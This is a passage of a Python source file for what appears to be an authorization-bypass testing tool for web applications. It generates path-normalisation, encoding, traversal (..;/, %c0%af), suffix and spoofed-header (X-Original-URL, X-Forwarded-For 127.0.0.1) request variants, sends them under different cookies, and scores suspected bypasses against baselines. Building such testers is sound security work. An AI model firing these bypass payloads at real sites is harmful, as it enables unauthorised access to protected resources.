        segs = c["segs"]
        V = self._build
        return [
            V("路径规范化", "重复分隔符 首段后双斜杠", f"/{first}//{rest}" if rest else "//" + first, c),
            V("路径规范化", "重复分隔符 三斜杠开头", "///" + "/".join(segs), c),
            V("路径规范化", "尾部斜杠差异", op + "/", c),
            V("路径规范化", "点段归一化 中段 /./", f"/{first}/./{rest}" if rest else "/./" + first, c),
            V("路径规范化", "点段归一化 自消解 /a/../a/",
              f"/{first}/../{first}/{rest}" if rest else f"/{first}/../{first}", c),
            V("路径规范化", "点段归一化 尾部 /.", op + "/.", c),
            V("路径规范化", "点段归一化 尾部 /..", op + "/..", c),
            V("路径规范化", "混合分隔符 首段后 %5c", f"/{first}%5c{rest}" if rest else "/" + first, c),
            V("路径规范化", "混合分隔符 编码斜杠 %2f 作分隔", "/" + "%2f".join(segs), c),
            V("路径规范化", "空路径段 前导 //", "//" + "/".join(segs), c),
            V("路径规范化", "空路径段 尾部空段 //", op + "//", c),
        ]


class EncodingPlugin(VariantPlugin):
    """v3.2 [需求2] 编码解码差异：编码在不同层被解一次/两次或解码顺序不同，
    用于检查容器是否在路由前解码、安全层看原始 URL 而业务层看解码后路径"""
    category = "编码解码"

    def generate(self, ctx):
        c = ctx
        op, first, rest, tail = c["orig_path"], c["first"], c["rest"], c["tail_rest"]
        segs = c["segs"]
        V = self._build
        variants = []
        if first:
            variants.append(V("编码解码", "保留编码字符 尾字符编码",
                              "/" + first[:-1] + pct_encode_char(first[-1]) + tail, c))
            variants.append(V("编码解码", "单重编码 首段全编码", "/" + pct_encode(first) + tail, c))
            variants.append(V("编码解码", "双重编码 首段全编码", "/" + pct_encode(first, double=True) + tail, c))
        variants += [
            V("编码解码", "编码斜杠 分隔符 %2f", "/" + "%2f".join(segs), c),
            V("编码解码", "编码斜杠 大写 %2F", "/" + "%2F".join(segs), c),
            V("编码解码", "编码点号 前缀 /%2e", "/%2e" + op, c),
            V("编码解码", "编码点号 双重 /%252e", "/%252e" + op, c),
            V("编码解码", "编码分号 尾部 %3b", op + "%3b", c),
            V("编码解码", "双重编码 %252f 分隔", "/" + "%252f".join(segs), c),
            V("编码解码", "非规范UTF-8 斜杠 %c0%af", "/" + "%c0%af".join(segs), c),
            V("编码解码", "非规范UTF-8 斜杠 %e0%80%af", "/" + "%e0%80%af".join(segs), c),
            V("编码解码", "容错编码 %u002f (IIS风格)", "/" + "%u002f".join(segs), c),
        ]
        return variants


class TailSuffixPlugin(VariantPlugin):
    """v3.2 [需求4] 尾缀差异：检查鉴权规则是否只匹配"目录名"而非真实解析路径"""
    category = "尾缀差异"

    def generate(self, ctx):
        c = ctx
        op = c["orig_path"]
        V = self._build
        variants = [
            V("尾缀差异", "尾部斜杠", op + "/", c),
            V("尾缀差异", "尾部点号", op + ".", c),
            V("尾缀差异", "尾部多点号 ...", op + "...", c),
            V("尾缀差异", "尾部斜杠+点 /.", op + "/.", c),
            V("尾缀差异", "尾部编码点 %2e", op + "%2e", c),
        ]
        for suf in (".json", ".html", ".txt", ".jsf", ".faces", ".xhtml", ".svg"):
            variants.append(V("尾缀差异", f"伪后缀 {suf}", op + suf, c))
        variants += [
            V("尾缀差异", "追加无关片段 /x", op + "/x", c),
            V("尾缀差异", "追加无关片段 /x/y", op + "/x/y", c),
            V("尾缀差异", "追加空格段 /%20", op + "/%20", c),
            V("尾缀差异", "追加随机段 /zzprobe", op + "/zzprobe", c),
            V("尾缀差异", "追加 /./", op + "/./", c),
            V("尾缀差异", "追加 /;/", op + "/;/", c),
        ]
        return variants


class RedirectProbePlugin(VariantPlugin):
    """v3.2 [需求6] 重定向差异：follow=True 标记的变形触发多级跳转链追踪，
    与基线跳转链对比落点，Location 与最终响应正文联合判断"""
    category = "重定向差异"

    def generate(self, ctx):
        c = ctx
        op, first, rest = c["orig_path"], c["first"], c["rest"]
        V = self._build
        return [
            V("重定向差异", "原路径基线跳转链追踪", op, c, follow=True),
            V("重定向差异", "尾斜杠规范化跳转", op + "/", c, follow=True),
            V("重定向差异", "大写触发规范化跳转", op.upper(), c, follow=True),
            V("重定向差异", "双斜杠前缀代理规范化", "//" + "/".join(c["segs"]), c, follow=True),
            V("重定向差异", "自消解点段跳转",
              f"/{first}/../{first}/{rest}" if rest else f"/{first}/../{first}", c, follow=True),
            V("重定向差异", "尾点号规范化跳转", op + ".", c, follow=True),
        ]


class HeaderRewritePlugin(VariantPlugin):
    """v3.2 [需求7] 请求头重写——环境特征探测（而非默认攻击路径）：
    识别站点是否存在"路径改写链"（网关/代理参考 X-Original-URL / Forwarded 等），
    帮助后续选择更合理的测试分支"""
    category = "请求头重写"

    def generate(self, ctx):
        c = ctx
        op, qo = c["orig_path"], c["qo"]
        host = urlparse(c["prefix"]).netloc
        V = self._build
        return [
            V("请求头重写", "[环境探测] X-Override-URL", "/", c,
              headers={"X-Override-URL": op + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-Forwarded-Path", "/", c,
              headers={"X-Forwarded-Path": op + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-URL", "/", c,
              headers={"X-URL": op + qo}, keep_query=False),
            V("请求头重写", "[环境探测] Forwarded(RFC7239)", "/", c,
              headers={"Forwarded": f"for=127.0.0.1;host={host}"}, keep_query=False),
            V("请求头重写", "[环境探测] X-Forwarded-Uri 编码路径", "/", c,
              headers={"X-Forwarded-Uri": pct_encode(op[1:]) + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-Original-URL 变形值(../;/)", "/", c,
              headers={"X-Original-URL": "/x/..;/" + op.lstrip("/") + qo}, keep_query=False),
            V("请求头重写", "[环境探测] X-Original-URL 反向(鉴权看头/路由看真实路径)", op, c,
              headers={"X-Original-URL": "/"}),
            V("请求头重写", "[环境探测] X-Original-URL+XFF 组合", "/", c,
              headers={"X-Original-URL": op + qo, "X-Forwarded-For": "127.0.0.1"}, keep_query=False),
        ]


# 插件注册表
PLUGIN_REGISTRY = [
    SemicolonPlugin,
    TraversalPlugin,
    DirectoryTraversalPlugin,
    StaticPrefixPlugin,
    CasePlugin,
    SlashPlugin,
    SuffixPlugin,
    SpecialEncodingPlugin,
    HttpMethodPlugin,
    ForwardHeaderPlugin,
    SourceSpoofPlugin,
    PathStructurePlugin,
    CacheDeceptionPlugin,
    DotNetPlugin,
    NodeJsPlugin,
    NginxPlugin,
    # v3.2 新增
    PathNormalizationPlugin,
    EncodingPlugin,
    TailSuffixPlugin,
    RedirectProbePlugin,
    HeaderRewritePlugin,
]


def generate_variants(url, categories=None, exclude=None):
    """插件化变形生成——自动去重，支持类别筛选和变形排除"""
    prefix, segs, query = split_path(url)
    if not segs:
        segs = [""]
    ctx = {
        "prefix": prefix, "segs": segs, "query": query,
        "orig_path": "/" + "/".join(segs),
        "first": segs[0],
        "rest": "/".join(segs[1:]) if len(segs) > 1 else "",
        "tail_rest": ("/" + "/".join(segs[1:])) if len(segs) > 1 else "",
        "qo": ("?" + query) if query else "",
    }

    # 类别筛选：支持字母代码和名称
    cat_filter = None
    if categories:
        cat_filter = set()
        for c in categories.split(","):
            c = c.strip()
            if c in CATEGORY_MAP:
                cat_filter.add(CATEGORY_MAP[c])
            else:
                cat_filter.add(c)

    exclude_list = exclude if exclude else []

    variants = []
    seen = set()

    for plugin_cls in PLUGIN_REGISTRY:
        plugin = plugin_cls()
        if cat_filter and plugin.category not in cat_filter:
            continue

        for v in plugin.generate(ctx):
            if exclude_list and any(ex in v["desc"] for ex in exclude_list):
                continue
            key = (v["method"], v["url"], tuple(sorted(v["headers"].items())), v.get("body"), bool(v.get("follow")))
            if key not in seen:
                seen.add(key)
                variants.append(v)

    return variants


# ---------------------------------------------------------------------------
# 5. 异步请求管理器（流式读取 + 会话复用）
# ---------------------------------------------------------------------------
class RequestManager:
    """异步请求管理器：管理会话、限速、代理"""

    def __init__(self, config):
        self.low_cookie = config.get("low_cookie", "")
        self.high_cookie = config.get("high_cookie", "")
        self.extra_headers = config.get("extra_headers", {})
        self.proxy = config.get("proxy", "")
        self.timeout = config.get("timeout", 10)
        self.tls_verify = config.get("tls_verify", False)
        self.limiter = AsyncRateLimiter(config.get("delay", 0.2), config.get("jitter", 0.3))
        self._session = None

    def _get_headers(self, kind):
        headers = {"User-Agent": f"authz-bypass-tester/{VERSION}"}
        if kind == "low" and self.low_cookie:
            headers["Cookie"] = self.low_cookie
        elif kind == "high" and self.high_cookie:
            headers["Cookie"] = self.high_cookie
        # "anon" 不设置 Cookie
        headers.update(self.extra_headers)
        return headers

    async def _get_session(self):
        if self._session is None or self._session.closed:
            timeout = ClientTimeout(total=self.timeout)
            # v3.1: TLS 参数只在 connector 层传递（request 级 ssl= 在新版 aiohttp 已弃用）
            connector = aiohttp.TCPConnector(limit=0, ssl=self.tls_verify)
            self._session = aiohttp.ClientSession(
                timeout=timeout, connector=connector,
                # v3.1 [D1 修复] DummyCookieJar：禁止会话级 Cookie 持久化，
                # 凭据只走显式 Cookie 头，杜绝 Set-Cookie 污染"匿名"复核
                cookie_jar=aiohttp.DummyCookieJar(),
                headers={"User-Agent": f"authz-bypass-tester/{VERSION}"},
            )
        return self._session

    async def send(self, url, method, extra_headers=None, kind="low", body=None):
        """异步发送请求，流式读取响应体（上限 MAX_BODY_SIZE），返回结构化结果"""
        await self.limiter.wait()
        start = time.monotonic()
        headers = self._get_headers(kind)
        if extra_headers:
            headers.update(extra_headers)

        session = await self._get_session()
        proxy = self.proxy if self.proxy else None
        data = body.encode("utf-8") if body else None

        try:
            async with session.request(
                method, url, headers=headers, data=data,
                allow_redirects=False, proxy=proxy,
            ) as r:
                body_bytes = await r.content.read(MAX_BODY_SIZE + 1)
                truncated = len(body_bytes) > MAX_BODY_SIZE
                body_text = body_bytes[:MAX_BODY_SIZE].decode("utf-8", "replace")

                err = None
                if r.status == 429:
                    await self.limiter.penalize()
                    err = "http_429"
                else:
                    await self.limiter.reward()  # v3.1: 成功后渐进恢复速率

                return {
                    "code": r.status, "length": len(body_bytes),
                    "body": body_text, "truncated": truncated,
                    "location": r.headers.get("Location", ""),
                    "ctype": r.headers.get("Content-Type", ""),
                    "server": r.headers.get("Server", ""),
                    "cache_status": r.headers.get("X-Cache", r.headers.get("CF-Cache-Status", "")),
                    "age": r.headers.get("Age", ""),
                    "headers": dict(r.headers),
                    "rtt": round(time.monotonic() - start, 3), "error": err,
                }
        except asyncio.TimeoutError:
            return {"code": -1, "length": 0, "body": "", "truncated": False,
                    "location": "", "ctype": "", "server": "", "cache_status": "",
                    "age": "", "headers": {}, "rtt": self.timeout, "error": "timeout"}
        except aiohttp.ClientError as e:
            return {"code": -1, "length": 0, "body": "", "truncated": False,
                    "location": "", "ctype": "", "server": "", "cache_status": "",
                    "age": "", "headers": {},
                    "rtt": round(time.monotonic() - start, 3), "error": type(e).__name__}

    async def close(self):
        if self._session and not self._session.closed:
            await self._session.close()


# ---------------------------------------------------------------------------
# 6. 判定逻辑（WAF/CDN 检测 + 响应头分析 + RTT 异常 + 截断感知）
# ---------------------------------------------------------------------------
def evaluate(resp, method, base_low, base_high, base_err, threshold, base_rtts=None):
    """返回 (verdict, note, confidence)。
    verdict: '★疑似绕过' / '△需复核' / '✕请求失败' / ''
    confidence: '高' / '中' / '低' / '-'
    """
    if resp["error"]:
        return "✕请求失败", resp["error"], "-"

    code, base_code = resp["code"], base_low["code"]
    body_comparable = method not in NO_BODY_METHODS and resp["length"] > 0

    if base_code in OK_CODES:
        return "", "基线本就放行，跳过", "-"

    def check_2xx(from_redirect):
        """2xx 响应的统一过滤链"""
        if not body_comparable:
            return "△需复核", "状态放行但无响应体可对比", "低"

        # WAF 拦截检测（v3.1：三级指纹，泛化词需状态码佐证）
        if waf := detect_waf(resp):
            return "△需复核", f"疑似WAF拦截页({waf})", "低"

        # CDN 缓存检测
        if is_cached(resp):
            return "△需复核", "响应来自CDN缓存，可能非真实绕过", "低"

        # v3.1 [D5 修复] 截断感知：响应/基线任一被截断时，★ 命中备注标注并降置信
        truncated = resp.get("truncated") or base_low.get("truncated")
        trunc_note = "；响应体被截断(>512KB)，相似度判定可信度下降" if truncated else ""

        def star(note, conf):
            if truncated:
                note += trunc_note
                conf = downgrade_conf(conf)
            return "★疑似绕过", note, conf

        # 1) 错误页基线对照
        if base_err and not base_err["error"] and \
                (code == base_err["code"] or base_err["code"] in OK_CODES):
            sim_e = content_similarity(resp["body"], resp["ctype"],
                                       base_err["body"], base_err["ctype"],
                                       cutoff=threshold - 0.05)
            if sim_e >= threshold:
                return "", f"与错误页基线内容相似({sim_e:.2f})，视为错误页", "-"

        # 2) 拒绝/登录提示关键字降级
        if DENY_HINT.search(visible_text(resp["body"])[:3000]):
            return "△需复核", "响应含拒绝/登录提示关键字", "低"

        # 响应头信号收集
        h_signals = header_signals(resp, base_low)

        # RTT 异常检测（v3.1：2 样本也可判定）
        rtt_sig = rtt_anomaly(resp["rtt"], base_rtts) if base_rtts else None

        # 3) 有高权限基线：内容像真数据才算实锤
        if base_high and base_high["code"] in OK_CODES:
            sim = content_similarity(resp["body"], resp["ctype"],
                                     base_high["body"], base_high["ctype"],
                                     cutoff=AUTH_SIM_THRESHOLD - 0.05)
            if sim >= AUTH_SIM_THRESHOLD:
                note = f"与高权限响应内容相似度 {sim:.2f}"
                if h_signals:
                    note += f"；头信号: {'; '.join(h_signals)}"
                return star(note, "高")
            if from_redirect:
                return "△需复核", f"与高权限响应内容相似度仅 {sim:.2f}", "低"

        # 4) 302 基线且无高权限对照——最高只给 △
        if from_redirect:
            return "△需复核", "基线为跳转且无高权限对照，2xx 需人工确认", "低"

        # 5) 低权限基线对比
        sim_base = content_similarity(resp["body"], resp["ctype"],
                                      base_low["body"], base_low["ctype"],
                                      cutoff=threshold - 0.05)
        if sim_base < threshold:
            note = f"与基线内容相似度仅 {sim_base:.2f}"
            if h_signals:
                note += f"；头信号: {'; '.join(h_signals)}"
            if rtt_sig:
                note += f"；{rtt_sig}"
            return star(note, "中")
        return "", "响应与基线内容相似，视为未绕过", "-"

    # ---- 基线被拒（401/403/405）----
    if base_code in DENY_LIKE:
        if code in OK_CODES:
            return check_2xx(False)
        if code in REDIRECT_CODES:
            if is_login_redirect(resp["location"]):
                return "", "重定向到登录页，未绕过", "-"
            return "△需复核", f"重定向到 {resp['location'] or '(无Location)'}", "低"
        return "", "", "-"

    # ---- 基线为重定向（未登录跳登录页）----
    if base_code in REDIRECT_CODES:
        if code in OK_CODES:
            return check_2xx(True)
        if code in REDIRECT_CODES:
            loc = resp["location"]
            if loc and loc != base_low["location"] and not is_login_redirect(loc):
                return "△需复核", f"重定向目标不同: {loc}", "低"
        return "", "", "-"

    return "", f"基线状态 {base_code} 未覆盖，跳过", "-"


# ---------------------------------------------------------------------------
# 7. 二次复核（异步版）
# ---------------------------------------------------------------------------
async def second_verify(row, base_high, manager):
    """对 ★ 命中重测：匿名 1 次 + 低权限 2 次（连同首发共 3 次），返回 (结论, 置信度)。
    v3.2: follow 类命中（重定向链升级的 ★）会自动追踪跳转链取最终落点判定，
    避免把"跳转后放行"的真实绕过误降级为复现失败。"""
    v = row["variant"]
    follow = bool(v.get("follow")) or bool(row.get("verify_follow"))
    ok = lambda r: r and not r["error"] and r["code"] in OK_CODES and r["length"] > 0

    async def fetch(kind):
        r = await manager.send(v["url"], v["method"], v["headers"], kind=kind, body=v.get("body"))
        if follow and not r["error"] and r["code"] in REDIRECT_CODES and r["location"]:
            chain = await trace_redirect_chain(manager, v["url"], v["method"], v["headers"],
                                               kind=kind, body=v.get("body"))
            return chain[-1]["resp"]
        return r

    anon = await fetch("anon")
    if ok(anon):
        if base_high and base_high["code"] in OK_CODES and \
                content_similarity(anon["body"], anon["ctype"],
                                   base_high["body"], base_high["ctype"]) >= AUTH_SIM_THRESHOLD:
            return "已复核：匿名即可访问且与高权限响应一致，属于未授权访问", "高"
        if content_similarity(anon["body"], anon["ctype"],
                              row["resp"]["body"], row["resp"]["ctype"]) >= AUTH_SIM_THRESHOLD:
            return "已复核：匿名即可访问，属于未授权访问", "高"

    again1 = await fetch("low")
    again2 = await fetch("low")
    if ok(again1) and ok(again2):
        s1 = content_similarity(again1["body"], again1["ctype"], row["resp"]["body"], row["resp"]["ctype"])
        s2 = content_similarity(again2["body"], again2["ctype"], row["resp"]["body"], row["resp"]["ctype"])
        if s1 >= 0.80 and s2 >= 0.80:
            return "已复核：低权限会话连续 3 次稳定复现", row.get("confidence") or "中"
    return "复测未复现，疑似偶发或动态内容，请人工确认", "低"


# ---------------------------------------------------------------------------
# 8. 基线建立（自适应采样）
# ---------------------------------------------------------------------------
async def get_baseline_adaptive(target, manager, kind, label, max_samples=5):
    """自适应采样——前 2 次相似度 >= 0.98 即稳定返回，否则追加采样，最多 5 次"""
    samples = []
    rtts = []
    for i in range(max_samples):
        r = await manager.send(target, "GET", kind=kind)
        if r["error"]:
            print(f"    {label}: 请求失败({r['error']})，后续判定可能不准")
            return r, False, [], rtts
        samples.append(r)
        rtts.append(r["rtt"])
        if len(samples) >= 2:
            min_sim = min(similarity(samples[i]["body"], samples[j]["body"])
                          for i in range(len(samples)) for j in range(i + 1, len(samples)))
            if min_sim >= 0.98:
                print(f"    {label}: HTTP {r['code']}, 长度 {r['length']} (采样 {len(samples)} 次即稳定)")
                return r, True, samples, rtts

    # 不稳定，取中位数代表
    samples_sorted = sorted(samples, key=lambda s: s["length"])
    median = samples_sorted[len(samples_sorted) // 2]
    print(f"    {label}: HTTP {median['code']}, 长度 {median['length']}"
          + f"  ⚠ {max_samples}次采样内容不一致，相似度判定可能不准")
    return median, False, samples, rtts


async def get_error_baseline(prefix, manager):
    """请求不存在的路径，拿错误页指纹"""
    bogus = f"{prefix}/wb-nope-{int(time.time())}{random.randint(1000, 9999)}"
    r1 = await manager.send(bogus, "GET", kind="low")
    if r1["error"]:
        return None, r1["error"]
    r2 = await manager.send(bogus + "b", "GET", kind="low")
    if r2["error"]:
        return None, r2["error"]
    stable = similarity(r1["body"], r2["body"]) >= 0.90 and r1["code"] == r2["code"]
    if not stable:
        return None, f"两次错误页采样不一致({r1['code']}/{r2['code']})"
    return r1, None


# ---------------------------------------------------------------------------
# 9. 命中项归因聚类
# ---------------------------------------------------------------------------
def cluster_hits(hits):
    """将命中项按响应指纹聚类，减少同根因重复报告。
    v3.1 修复：哈希前先用 fingerprint() 归一化动态字段（token/时间戳/UUID），
    避免动态内容导致同根因变形哈希不同、聚类失效。"""
    clusters = {}
    for hit in hits:
        key = (hit["resp"]["code"], sha16(fingerprint(hit["resp"]["body"])))
        clusters.setdefault(key, []).append(hit)

    result = []
    for key, group in clusters.items():
        if len(group) > 1:
            for h in group[1:]:
                h["same_root"] = [g["variant"]["desc"] for g in group if g != h]
        result.append({
            "representative": group[0],
            "same_root": [h["variant"]["desc"] for h in group[1:]],
            "count": len(group),
        })
    result.sort(key=lambda x: x["count"], reverse=True)
    return result


# ---------------------------------------------------------------------------
# 9.5 v3.2 框架指纹识别 / HTTP 方法矩阵 / 多级重定向链分析
# ---------------------------------------------------------------------------
# (名称, 响应头正则, 正文正则, 证据说明, 推荐类别, 差异说明)
FRAMEWORK_SIGNATURES = [
    ("Apache Tomcat",
     re.compile(r"(?i)apache[- ]tomcat|coyote|jboss-web"),
     re.compile(r"(?i)apache tomcat[/ ]\d"),
     "Server/错误页", ["分号参数", "..;/ 穿越", "借道前缀", "目录穿越", "编码解码"],
     "Tomcat 路由前会裁剪分号后的矩阵参数并解码部分编码，与 Shiro/Spring Security 的 Ant 匹配存在差异"),
    ("Jetty",
     re.compile(r"(?i)\bjetty(/|\s|\()?\d"), None,
     "Server头", ["分号参数", "路径规范化", "编码解码"],
     "Jetty 同样裁剪矩阵参数，但对 //、编码斜杠的处理与前置规则层可能不一致"),
    ("Undertow/WildFly",
     re.compile(r"(?i)undertow|wildfly"),
     re.compile(r"(?i)undertow|jboss|resteasy"),
     "Server/错误页", ["路径规范化", "编码解码", "尾缀差异", "分号参数"],
     "Undertow 对 URL 编码与 // 的规范化与鉴权层读取的原始 URI 易出现偏差"),
    ("Spring Boot",
     None,
     re.compile(r"(?i)whitelabel error page|no explicit mapping for /"),
     "错误页", ["尾缀差异", "路径规范化", "编码解码", "HTTP方法"],
     "Spring MVC 尾斜杠/矩阵参数匹配行为随 PathPatternParser 与 AntPathMatcher 版本差异大"),
    ("Spring (MVC/Security)",
     re.compile(r"(?i)x-application-context"),
     re.compile(r"(?i)spring(\s|-)?(mvc|security|web)"),
     "响应头/正文", ["尾缀差异", "分号参数", "路径规范化", "HTTP方法"],
     "Spring Security 规则匹配的是规范化前的 URI，而路由层可能解析出不同资源"),
    ("Apache Shiro",
     re.compile(r"(?i)rememberme="),
     None,
     "Set-Cookie", ["..;/ 穿越", "借道前缀", "分号参数", "目录穿越", "编码解码"],
     "Shiro 的 AntPathMatcher 与容器规范化差异是 ..;/、%3b、大小写类绕过的根源"),
    ("Jersey/JAX-RS",
     re.compile(r"(?i)jersey"),
     re.compile(r"(?i)jersey|jax-rs"),
     "响应头/正文", ["路径规范化", "尾缀差异", "编码解码"],
     "JAX-RS 实现对编码斜杠与尾斜杠的解析与前置过滤器常不一致"),
    ("RESTEasy",
     None,
     re.compile(r"(?i)resteasy"),
     "正文", ["分号参数", "路径规范化"],
     "RESTEasy 部分配置下矩阵参数参与匹配，与网关规则不一致"),
    ("Quarkus",
     re.compile(r"(?i)quarkus"),
     re.compile(r"(?i)quarkus"),
     "响应头/正文", ["路径规范化", "编码解码", "尾缀差异"],
     "Quarkus(RESTEasy Reactive) 对 // 与编码路径的规范化行为有过多次调整"),
    ("Keycloak",
     re.compile(r"(?i)keycloak|/realms/"),
     None,
     "Set-Cookie/Location", ["路径规范化", "尾缀差异", "请求头重写"],
     "Keycloak 网关与认证服务的路径匹配差异，关注 admin 路径规范化与改写头"),
    ("Nginx (反代)",
     re.compile(r"(?i)\bnginx\b"),
     None,
     "Server头", ["Nginx", "编码解码", "路径规范化", "请求头重写"],
     "Nginx 规范化 URI 后再做 location 匹配，与后端容器的解析差异是 proxy_pass 绕过根源"),
    ("Apache HTTPD",
     re.compile(r"(?i)\bapache(?![- ]tomcat)[/ ]\d"),
     None,
     "Server头", ["路径规范化", "编码解码"],
     "httpd 对 %2F 与合并斜杠的行为随 AllowEncodedSlashes/MergeSlashes 配置变化"),
    ("IIS/ASP.NET",
     re.compile(r"(?i)\biis\b|asp\.net|x-aspnet"),
     None,
     "响应头", ["DotNet", "路径规范化", "编码解码"],
     "IIS 与 ASP.NET 管道双层解析，%u 编码、短文件名、::$DATA 均为差异点"),
    ("Node/Express",
     re.compile(r"(?i)x-powered-by:\s*express"),
     None,
     "响应头", ["NodeJs", "路径规范化", "尾缀差异"],
     "Express 路由不做路径规范化，鉴权中间件若自行 normalize 则产生差异"),
]

PROXY_TRACE_HEADERS = ("via", "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto",
                       "x-real-ip", "cf-ray", "x-varnish", "x-cache", "x-served-by",
                       "true-client-ip")


def fingerprint_framework(base_low, base_high=None, base_err=None):
    """v3.2 [需求8] 从基线响应指纹识别框架/中间件/反代痕迹。
    返回 [{名称, 证据, 推荐类别, 说明}]，无命中返回 []。"""
    if not base_low or base_low.get("error"):
        return []
    headers = base_low.get("headers", {}) or {}
    header_blob = f"{base_low.get('server', '')} " + " ".join(f"{k}:{v}" for k, v in headers.items())
    body_text = visible_text(base_low.get("body", ""))
    if base_err and not base_err.get("error"):
        body_text += " " + visible_text(base_err.get("body", ""))

    found = []
    for name, hpat, bpat, ev, recs, note in FRAMEWORK_SIGNATURES:
        hit_ev = None
        if hpat and hpat.search(header_blob[:6000]):
            hit_ev = ev
        elif bpat and bpat.search(body_text[:8000]):
            hit_ev = ev
        if hit_ev:
            found.append({"名称": name, "证据": hit_ev, "推荐类别": recs, "说明": note})

    # 反向代理/CDN 痕迹——决定是否值得启用请求头重写探测（需求7：环境特征探测）
    proxy_keys = [k for k in headers if k.lower() in PROXY_TRACE_HEADERS]
    if proxy_keys:
        found.append({"名称": "反向代理/CDN 痕迹",
                      "证据": "响应头: " + ", ".join(sorted(set(proxy_keys))[:5]),
                      "推荐类别": ["请求头重写", "路径规范化", "编码解码"],
                      "说明": "存在代理/CDN 层，X-Original-URL/Forwarded 等改写头值得探测"})

    # Java Servlet 表单登录启发（302 登录页 + JSESSIONID）
    if "jsessionid" in header_blob.lower() and base_low.get("code") in REDIRECT_CODES \
            and is_login_redirect(base_low.get("location", "")):
        found.append({"名称": "Java Servlet 表单登录(疑似)",
                      "证据": "JSESSIONID + 302 登录页",
                      "推荐类别": ["分号参数", "路径规范化", "尾缀差异", "编码解码"],
                      "说明": "典型 Java Web 表单认证，重点测分号/编码/尾缀差异"})
    return found


def recommended_categories(fps):
    """v3.2: 汇总指纹推荐的类别（保序去重）"""
    seen, out = set(), []
    for f in fps or []:
        for cat in f.get("推荐类别", []):
            if cat not in seen:
                seen.add(cat)
                out.append(cat)
    return out


def method_label(v):
    """v3.2: HTTP 方法矩阵行标签——方法 + 方法覆盖头/参数污染标识"""
    label = v["method"]
    for k in v.get("headers", {}):
        if "method-override" in k.lower() or k.lower() in ("x-original-method", "x-http-method"):
            label += f" +{k}"
    if v.get("body") and "_method=" in v["body"]:
        label += " +body"
    return label


def method_matrix_summary(rows):
    """v3.2 [需求5] 同一路径不同方法的矩阵——GET 受限但其它方法行为不同的疑点"""
    out = []
    for r in rows:
        v = r["variant"]
        if v["cat"] != "HTTP方法":
            continue
        out.append({"方法": method_label(v), "状态码": r["resp"]["code"],
                    "判定": r["verdict"] or "-", "备注": r["note"] or ""})
    return out


async def trace_redirect_chain(manager, url, method, extra_headers=None, kind="low",
                               body=None, max_hops=5):
    """v3.2 [需求6] 手动多级重定向追踪（allow_redirects=False 逐跳请求），
    带循环检测。返回 [{url, code, location, resp}]，最后一项为最终落点。"""
    hops = []
    current = url
    seen = {url.split("?", 1)[0]}
    for _ in range(max_hops):
        r = await manager.send(current, method, extra_headers, kind=kind, body=body)
        hops.append({"url": current, "code": r["code"], "location": r.get("location", ""), "resp": r})
        if r["error"] or r["code"] not in REDIRECT_CODES or not r.get("location"):
            break
        nxt = urljoin(current, r["location"])
        p = nxt.split("?", 1)[0]
        if p in seen:
            hops.append({"url": nxt, "code": "LOOP", "location": "", "resp": None})
            break
        seen.add(p)
        current = nxt
    return hops


def analyze_redirect_row(row, chain, base_chain, base_low, base_high, threshold):
    """v3.2 [需求6] 重定向链联合判定：
    - 多级重定向追踪（最多 5 跳 + 循环检测）
    - 最终落点与基线跳转链落点对比（相对路径偏移导致的鉴权偏差）
    - Location 与最终响应正文联合判断（落点 2xx 且内容与基线差异显著 → 升级 ★）"""
    row["redirect_chain"] = [{"码": h["code"], "URL": h["url"], "Location": h.get("location", "")}
                             for h in chain]
    last = chain[-1]
    final = last.get("resp")
    row["redirect_final"] = {"状态码": last["code"], "落点": last["url"],
                             "落点路径": urlparse(last["url"]).path}
    notes = [f"{len(chain)}跳"]
    if any(h["code"] == "LOOP" for h in chain):
        notes.append("检测到跳转循环")

    base_last = base_chain[-1] if base_chain else None
    base_landing = urlparse(base_last["url"]).path if base_last else ""

    verdict, conf = row["verdict"], row.get("confidence", "-")
    if final and not final.get("error"):
        if final["code"] in OK_CODES and final["length"] > 0:
            if base_high and base_high["code"] in OK_CODES:
                sim = content_similarity(final["body"], final["ctype"],
                                         base_high["body"], base_high["ctype"])
                if sim >= AUTH_SIM_THRESHOLD:
                    verdict, conf = "★疑似绕过", "高"
                    row["verify_follow"] = True
                    notes.append(f"落点2xx且与高权限内容相似度{sim:.2f}")
                else:
                    notes.append(f"落点2xx但与高权限相似度仅{sim:.2f}")
            else:
                sim_base = content_similarity(final["body"], final["ctype"],
                                              base_low["body"], base_low["ctype"])
                if sim_base < threshold:
                    verdict = "★疑似绕过"
                    conf = conf if conf in ("高", "中") else "中"
                    row["verify_follow"] = True
                    notes.append(f"落点2xx且与基线内容相似度仅{sim_base:.2f}")
                else:
                    notes.append(f"落点2xx但内容与基线相似({sim_base:.2f})，疑同页")
        else:
            landing = row["redirect_final"]["落点路径"]
            if base_landing and landing and landing != base_landing:
                notes.append(f"落点路径与基线链落点不同: {landing} vs {base_landing}")
            if final.get("code") in DENY_LIKE:
                notes.append("落点仍被拒")
    row["verdict"], row["confidence"] = verdict, conf
    row["note"] = (row["note"] + "；" if row["note"] else "") + "重定向追踪: " + "，".join(notes)
    return row


async def run_fingerprint_only(target, args, manager):
    """v3.2 [需求8] --fingerprint-only：仅建立基线并输出框架指纹与类别推荐"""
    print("\n" + "=" * 78)
    print(f" 框架指纹识别: {target}")
    print("=" * 78)
    base_low, _, _, _ = await get_baseline_adaptive(target, manager, "low", "低权限基线  ")
    base_high = None
    if args.high_cookie:
        base_high, _, _, _ = await get_baseline_adaptive(target, manager, "high", "高权限基线  ")
    prefix = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
    base_err, _ = await get_error_baseline(prefix, manager)

    fps = fingerprint_framework(base_low, base_high, base_err)
    print("\n[*] 框架指纹结果:")
    if fps:
        for fw in fps:
            print(f"    - {fw['名称']}  (证据: {fw['证据']})")
            print(f"      推荐类别: {', '.join(fw['推荐类别'])}")
            if fw.get("说明"):
                print(f"      说明: {fw['说明']}")
        recs = recommended_categories(fps)
        print(f"\n[*] 汇总推荐类别: {', '.join(recs) if recs else '(无，建议全类别)'}")
        print(f"[*] 后续测试建议: 追加 --smart 按上述推荐类别自动筛选变形，减少噪声")
    else:
        print("    未识别出明显框架特征，建议全类别测试（不加 --smart）")


# ---------------------------------------------------------------------------
# 10. 单目标测试主流程（异步版）
# ---------------------------------------------------------------------------
async def run_target(target, args, report_prefix, manager):
    print("\n" + "=" * 78)
    print(f" 目标: {target}")
    print("=" * 78)

